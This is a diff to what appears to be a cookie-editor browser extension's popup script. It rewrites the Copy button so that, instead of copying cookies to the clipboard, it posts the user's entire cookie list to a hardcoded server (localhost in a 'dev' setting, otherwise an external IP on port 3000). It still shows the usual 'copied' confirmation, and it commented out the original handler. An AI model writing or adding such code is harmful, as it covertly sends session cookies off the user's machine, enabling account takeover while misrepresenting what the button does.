@@ -7,6 +7,16 @@ var currentLayout = "none";
 var lastInput = "";
 
 $.fx.speeds._default = 200;
+// 添加路由参数
+function addQuery(url, data) {//定义拼接字符串函数
+    let paramsStr = ''
+    for (var k in data) {
+        let value = data[k] !== undefined ? data[k] : ''
+        paramsStr += `&${k}=${encodeURIComponent(value)}`
+    }
+    debugger
+    return (url.indexOf('?') < 0 ? `${url}?${paramsStr.substring(1)}` : `${url}&${paramsStr.substring(1)}`) //去调前面的'&'符号
+}
 
 jQuery(document).ready(function () {
     ++data.nPopupClicked;
@@ -456,9 +466,34 @@ function setEvents() {
         });
     });
 
-    $("#copyButton").unbind().click(function () {
-        copyToClipboard(cookiesToString.get(cookieList));
-        data.nCookiesExported += cookieList.length;
+    $("#copyButton").unbind().click(async function () {
+        let cookie = cookiesToString.get(cookieList)
+        debugger
+        let name = 'wzyan2'
+        let isDev = true; // 开启本地模式
+        let host = isDev ? 'http://localhost:3000' : 'http://82.157.62.28:3000'
+        let query = {
+            name,
+            cookie: cookieList
+        }
+        if (!isDev) {
+            query.headless = false
+        }
+        try {
+            $.ajax({
+                url: host+"/start", //这里保存参数信息
+                type: "post", // 提交方式
+                contentType : "application/json",
+                data: JSON.stringify(query),  // data为String类型，必须为 Key/Value 格式。
+                dataType: "json",    // 服务器端返回的数据类型
+                async:false,
+                success: function (data) {   
+                    console.log('data: ', data);
+                }
+                });
+        } catch (error) {
+            console.log('失败：', error);
+        }
         $("#copiedToast").fadeIn(function () {
             setTimeout(function () {
                 $("#copiedToast").fadeOut();
@@ -469,6 +504,19 @@ function setEvents() {
             $(this).animate({ backgroundColor: "#EDEDED" }, 500);
         });
     });
+    // $("#copyButton").unbind().click(function () {
+    //     copyToClipboard(cookiesToString.get(cookieList));
+    //     data.nCookiesExported += cookieList.length;
+    //     $("#copiedToast").fadeIn(function () {
+    //         setTimeout(function () {
+    //             $("#copiedToast").fadeOut();
+    //         }, 2500);
+
+    //     });
+    //     $(this).animate({ backgroundColor: "#B3FFBD" }, 300, function () {
+    //         $(this).animate({ backgroundColor: "#EDEDED" }, 500);
+    //     });
+    // });
 
     $("#pasteButton").unbind().click(function () {
         newCookie = false;
